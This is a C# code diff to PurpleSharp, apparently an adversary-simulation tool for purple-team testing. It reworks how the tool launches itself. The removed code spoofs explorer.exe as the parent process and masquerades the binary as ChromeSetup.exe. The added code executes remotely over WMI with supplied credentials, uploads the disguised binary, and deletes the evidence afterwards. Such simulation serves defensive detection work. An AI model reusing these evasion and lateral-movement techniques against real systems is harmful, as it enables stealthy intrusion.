@@ -3,7 +3,7 @@ using System.Diagnostics;
 using System.IO;
 using System.Management;
 using System.Text;
-
+using System.Threading.Tasks;
 
 namespace PurpleSharp
 {
@@ -111,21 +111,7 @@ namespace PurpleSharp
             if (rhost == "" && opsec)
             {
 
-                string currentPath = AppDomain.CurrentDomain.BaseDirectory;
-                Lib.Logger logger = new Lib.Logger(currentPath + "PurpleSharp.txt");
-                Process[] pr = Process.GetProcessesByName("explorer");
-
-                string currentUser = GetProcessOwner(pr[0].Id).Split('\\')[1];
-                //string shortuser = currentUser.Split('\\')[1];
-
-                string fullPath = Process.GetCurrentProcess().MainModule.FileName;
-                string path = "C:\\Users\\" + currentUser + "\\AppData\\Local\\Temp\\ChromeSetup.exe";
-                logger.Info("Copying binary to Appdata: " + path);
-                File.Copy(fullPath, path);
-                logger.Info("Spoofing explorer.exe. PID: " + pr[0].Id.ToString());
-                logger.Info("Executing: " + path );
-                Launcher.SpoofParent(pr[0].Id, path, "ChromeSetup.exe /technique " + technique);
-                
+                Lib.NamedPipes.RunServer("testpipe", technique);
                 return;
 
             }
@@ -140,27 +126,6 @@ namespace PurpleSharp
             }
             
             
-        }
-
-        //https://codereview.stackexchange.com/questions/68076/user-logged-onto-windows
-        public static string GetProcessOwner(int processId)
-        {
-            string query = "Select * From Win32_Process Where ProcessID = " + processId;
-            ManagementObjectSearcher searcher = new ManagementObjectSearcher(query);
-            ManagementObjectCollection processList = searcher.Get();
-
-            foreach (ManagementObject obj in processList)
-            {
-                string[] argList = new string[] { string.Empty, string.Empty };
-                int returnVal = Convert.ToInt32(obj.InvokeMethod("GetOwner", argList));
-                if (returnVal == 0)
-                {
-                    // return DOMAIN\user
-                    return argList[1] + "\\" + argList[0];
-                }
-            }
-
-            return "NO OWNER";
         }
 
         public static void ExecuteRemote(string rhost, string domain, string ruser, string rpwd, string technique, bool opsec)
@@ -194,8 +159,27 @@ namespace PurpleSharp
             string cmdline = "/technique "+ technique;
             if (opsec) cmdline = cmdline + " /opsec";
             Lib.RemoteLauncher.wmiexec(rhost, executionPath, cmdline, domain, ruser, rpwd);
-            System.Threading.Thread.Sleep(13000);
+            Console.WriteLine("[+] Connecting to named pipe...");
+            
+
+            string result = Lib.NamedPipes.RunClient(rhost, domain, ruser, rpwd, "testpipe");
+            //Console.WriteLine("function returned with: " + result);
+            string path = "C:\\Users\\" + result + "\\Downloads\\";
+            //string path = "C:\\Users\\" + result + "\\Downloads\\ChromeSetup.exe";
+            Lib.RemoteLauncher.upload(uploadPath, path + "ChromeSetup.exe", rhost, ruser, rpwd, domain);
+
+            Console.WriteLine("[+] Sending stop command...");
+            result = Lib.NamedPipes.RunClient(rhost, domain, ruser, rpwd, "testpipe",true);
+            System.Threading.Thread.Sleep(3000);
+            Console.WriteLine("[+] Cleaning up...");
             Lib.RemoteLauncher.delete(executionPath, rhost, ruser, rpwd, domain);
+            Lib.RemoteLauncher.delete(path + "ChromeSetup.exe", rhost, ruser, rpwd, domain);
+            Console.WriteLine("[+] Obtaining results...");
+            string results = Lib.RemoteLauncher.readFile(rhost, path + "PurpleSharp.txt", ruser, rpwd, domain);
+            Console.WriteLine("[+] Results:");
+            Console.WriteLine();
+            Console.WriteLine(results);
+            Lib.RemoteLauncher.delete(path + "PurpleSharp.txt", rhost, ruser, rpwd, domain);
 
 
         }
